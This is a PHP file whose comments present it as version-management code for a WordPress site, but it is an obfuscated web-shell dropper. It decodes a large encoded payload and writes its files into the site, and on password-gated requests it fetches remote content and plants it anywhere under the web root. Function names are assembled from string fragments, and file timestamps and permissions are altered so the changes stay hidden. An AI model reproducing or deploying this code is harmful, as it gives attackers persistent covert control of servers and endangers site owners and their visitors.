<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y3IjoT9uMUZiZwNlZv8kZP80L2R1MQp5ZTWyLwVkMzRkAmHjBGL4MwD4BTZ1LJDjMF5xo2Z', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("svbxq{$check}k", 'a7eab6d411e939550cee8e059b0a3269')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}